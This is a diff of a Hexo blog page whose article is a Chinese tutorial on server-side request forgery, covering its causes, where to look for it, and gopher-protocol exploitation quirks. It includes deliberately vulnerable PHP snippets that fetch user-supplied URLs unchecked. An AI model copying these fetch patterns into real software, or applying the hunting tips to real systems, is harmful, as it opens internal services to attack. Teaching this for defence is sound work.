@@ -1,115 +1,320 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
   
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="SSRF一、SSRF是什么？SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）  二、SSRF漏洞原理SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功">
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SSRF一、SSRF是什么？SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）  二、SSRF漏洞原理SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hexo">
+<meta property="og:title" content="SSRF">
 <meta property="og:url" content="http://example.com/2025/05/20/Web/SSRF/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="SSRF一、SSRF是什么？SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）  二、SSRF漏洞原理SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功">
-<meta property="og:locale" content="en_US">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/.com//image-20250520025641-k2sfyci.png">
 <meta property="og:image" content="http://example.com/.com//image-20250520025700-u9pjgmi.png">
 <meta property="og:image" content="http://example.com/.com//image-20250520025709-vdxc2ye.png">
 <meta property="og:image" content="http://example.com/.com//image-20250520025722-dq5eksz.png">
 <meta property="og:image" content="http://example.com/.com//image-20250520030023-ukm1uls.png">
-<meta property="article:published_time" content="2025-05-20T00:55:54.000Z">
-<meta property="article:modified_time" content="2025-05-20T00:55:54.000Z">
+<meta property="article:published_time" content="2025-05-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-21T13:22:45.980Z">
 <meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/.com//image-20250520025641-k2sfyci.png">
   
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
   
-    <link rel="shortcut icon" href="/favicon.png">
+  <title>SSRF - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/image/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
   
-<link rel="stylesheet" href="/css/style.css">
+
 
   
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-
-  
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
-
 <meta name="generator" content="Hexo 7.3.0"></head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
 
-      <div class="outer">
-        <section id="main"><article id="post-Web/SSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/SSRF/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>我的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/image/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SSRF"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-20 00:00" pubdate>
+          星期二, 五月 20日 2025, 12:00 凌晨
+        </time>
+      </span>
     
   </div>
-  <div class="article-inner">
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          2.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          23 分钟
+        
+      </span>
+    
+
     
     
-    <div class="e-content article-entry" itemprop="articleBody">
+  </div>
+
+
+        
+      </div>
+
       
-        <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="一、SSRF是什么？"><a href="#一、SSRF是什么？" class="headerlink" title="一、SSRF是什么？"></a>一、SSRF是什么？</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SSRF</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="一、SSRF是什么？"><a href="#一、SSRF是什么？" class="headerlink" title="一、SSRF是什么？"></a>一、SSRF是什么？</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
 <p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
 <hr>
 <h2 id="二、SSRF漏洞原理"><a href="#二、SSRF漏洞原理" class="headerlink" title="二、SSRF漏洞原理"></a>二、SSRF漏洞原理</h2><p><span data-type="text" style="background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);">SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</span></p>
-<p><img src="/.com//image-20250520025641-k2sfyci.png" alt="image"></p>
+<p><img src="/.com//image-20250520025641-k2sfyci.png" srcset="/image/loading.gif" lazyload alt="image"></p>
 <p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
 <hr>
 <h2 id="三、SSRF漏洞挖掘"><a href="#三、SSRF漏洞挖掘" class="headerlink" title="三、SSRF漏洞挖掘"></a>三、SSRF漏洞挖掘</h2><p>1、分享：通过URL地址分享网页内容</p>
-<p><img src="/.com//image-20250520025700-u9pjgmi.png" alt="image"></p>
+<p><img src="/.com//image-20250520025700-u9pjgmi.png" srcset="/image/loading.gif" lazyload alt="image"></p>
 <p>2、转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p>
 <p>3、在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p>
-<p><img src="/.com//image-20250520025709-vdxc2ye.png" alt="image"></p>
+<p><img src="/.com//image-20250520025709-vdxc2ye.png" srcset="/image/loading.gif" lazyload alt="image"></p>
 <p>4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p>
 </blockquote>
 <p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
 <p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p>
-<p><img src="/.com//image-20250520025722-dq5eksz.png" alt="image"></p>
+<p><img src="/.com//image-20250520025722-dq5eksz.png" srcset="/image/loading.gif" lazyload alt="image"></p>
 <p>6、图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。</p>
 <p>(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。</p>
 <p>7、从URL关键字中寻找<br>利用google 语法加上这些关键字去寻找SSRF漏洞</p>
@@ -121,22 +326,22 @@
 <h2 id="四、产生SSRF漏洞的函数"><a href="#四、产生SSRF漏洞的函数" class="headerlink" title="四、产生SSRF漏洞的函数"></a>四、产生SSRF漏洞的函数</h2><p>SSRF攻击可能存在任何语言编写的应用，接下来将举例&#x3D;&#x3D;php&#x3D;&#x3D;中可能存在SSRF漏洞的函数。</p>
 <p><strong>1、file_get_contents:</strong></p>
 <p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line">file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$img</span>; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) <br>&#123; <br><span class="hljs-variable">$content</span> = file_get_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]); <br><span class="hljs-variable">$filename</span> =<span class="hljs-string">&#x27;./images/&#x27;</span>.rand().<span class="hljs-string">&#x27;;img1.jpg&#x27;</span>; <br>file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span>); <br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]; <br><span class="hljs-variable">$img</span> = <span class="hljs-string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot;\&quot;/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$img</span>; <br>?&gt;<br></code></pre></td></tr></table></figure>
 
 <p><strong>2、sockopen():</strong></p>
 <p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">function</span> GetFile(<span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span>) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30); </span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$errstr</span> (error number <span class="variable">$errno</span>) \n&quot;</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="variable">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="variable">$host</span>\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123; </span><br><span class="line"><span class="variable">$contents</span>.= fgets(<span class="variable">$fp</span>, 1024); </span><br><span class="line">&#125; </span><br><span class="line">fclose(<span class="variable">$fp</span>); </span><br><span class="line"><span class="built_in">return</span> <span class="variable">$contents</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br><span class="hljs-keyword">function</span> GetFile(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span>) <br>&#123; <br><span class="hljs-variable">$fp</span> = fsockopen(<span class="hljs-variable">$host</span>, intval(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, 30); <br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$errstr</span> (error number <span class="hljs-variable">$errno</span>) \n&quot;</span>; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br><span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-variable">$link</span> HTTP/1.1\r\n&quot;</span>; <br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-variable">$host</span>\r\n&quot;</span>; <br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>fwrite(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br><span class="hljs-keyword">while</span> (!feof(<span class="hljs-variable">$fp</span>)) &#123; <br><span class="hljs-variable">$contents</span>.= fgets(<span class="hljs-variable">$fp</span>, 1024); <br>&#125; <br>fclose(<span class="hljs-variable">$fp</span>); <br><span class="hljs-built_in">return</span> <span class="hljs-variable">$contents</span>; <br>&#125; <br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
 
 <p><strong>3、curl_exec():</strong></p>
 <p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>);<br> <br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>注意事项</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">file_get_contents的gopher协议不能URL编码</span><br><span class="line">file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</span><br><span class="line">curl_exec() 默认不跟踪跳转，</span><br><span class="line">file_get_contents() file_get_contents支持php://input协议</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">一般情况下PHP不会开启fopen的gopher wrapper<br>file_get_contents的gopher协议不能URL编码<br>file_get_contents关于Gopher的302跳转会出现bug，导致利用失败<br>curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用<br>curl_exec() 默认不跟踪跳转，<br>file_get_contents() file_get_contents支持php://input协议<br></code></pre></td></tr></table></figure>
 
 <hr>
 <h2 id="五、SSRF中URL的伪协议"><a href="#五、SSRF中URL的伪协议" class="headerlink" title="五、SSRF中URL的伪协议"></a>五、SSRF中URL的伪协议</h2><p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</p>
